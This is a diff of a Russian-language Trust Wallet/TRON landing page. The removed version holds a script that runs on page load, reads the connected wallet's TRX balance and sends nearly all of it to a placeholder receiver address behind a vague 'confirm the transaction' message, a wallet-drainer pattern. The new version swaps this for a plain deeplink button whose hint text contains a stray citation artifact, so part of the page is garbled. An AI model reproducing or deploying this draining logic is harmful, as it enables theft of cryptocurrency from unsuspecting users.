@@ -1,99 +1,64 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-  <meta charset="UTF-8">
-  <title>Processing TRX...</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <title>Open Trust Wallet (TRON)</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 
   <style>
     body {
-      background: #020617;
+      background: #0f172a;
       color: #e5e7eb;
       font-family: Arial, sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
+    }
+    .card {
+      background: #020617;
+      padding: 24px;
+      border-radius: 12px;
+      max-width: 360px;
+      width: 100%;
       text-align: center;
     }
-    .box {
-      max-width: 360px;
+    button {
+      width: 100%;
+      padding: 14px;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+      background: #2563eb;
+      color: #fff;
     }
-    .status {
-      font-size: 14px;
-      opacity: 0.9;
+    .hint {
       margin-top: 12px;
-      word-break: break-all;
+      font-size: 14px;
+      opacity: 0.85;
     }
   </style>
 </head>
 <body>
 
-<div class="box">
-  <h2>Инициализация TRON…</h2>
-  <p>Подтвердите транзакцию в Trust Wallet</p>
-  <div class="status" id="status"></div>
+  <div class="card">
+    <h2>Открыть TRON в Trust Wallet</h2>
 
-  <p style="margin-top:16px">
-    <a href="https://link.trustwallet.com/open_url?coin_id=195&url=https://stariywah.github.io/test"
-       style="color:#60a5fa">
-      Открыть в Trust Wallet
+    <!-- Deeplink TRON (coin_id=195) -->
+    <a
+      href="https://link.trustwallet.com/open_url?coin_id=195&url=https://stariywah.github.io/test"
+      target="_blank"
+      rel="noopener"
+    >
+      <button>Открыть Trust Wallet (TRX)</button>
     </a>
-  </p>
-</div>
 
-<script>
-(async () => {
-  const status = document.getElementById("status");
-alert(window.tronWeb)
-  // ✅ Проверка TRON Web3-провайдера
-  if (typeof window.tronWeb === "undefined" || !window.tronWeb.ready) {
-    status.innerText = "❌ Откройте страницу через Trust Wallet (TRON)";
-    return;
-  }
-
-  try {
-    const tronWeb = window.tronWeb;
-
-    // 1. Адрес кошелька
-    const from = tronWeb.defaultAddress.base58;
-
-    // 2. Баланс (SUN)
-    const balanceSun = await tronWeb.trx.getBalance(from);
-
-    if (balanceSun <= 0) {
-      status.innerText = "❌ Баланс TRX = 0";
-      return;
-    }
-
-    // 3. Резерв 1 TRX (за bandwidth)
-    const reserve = 1_000_000; // 1 TRX
-    const amount = balanceSun - reserve;
-
-    if (amount <= 0) {
-      status.innerText = "❌ Недостаточно TRX для перевода";
-      return;
-    }
-
-    status.innerText = "⏳ Ожидание подтверждения транзакции…";
-
-    // 4. Транзакция
-    const tx = await tronWeb.trx.sendTransaction(
-      "T_RECEIVER_ADDRESS",
-      amount
-    );
-
-    status.innerText =
-      "✅ Транзакция отправлена:\n" + tx.txid;
-
-  } catch (e) {
-    status.innerText =
-      "❌ Отменено или ошибка:\n" + (e.message || e);
-  }
-})();
-</script>
+    <div class="hint">
+      Требуется установленный :contentReference[oaicite:0]{index=0}<br/>
+      Сеть: <b>TRON (TRX)</b>
+    </div>
+  </div>
 
 </body>
 </html>
-
-
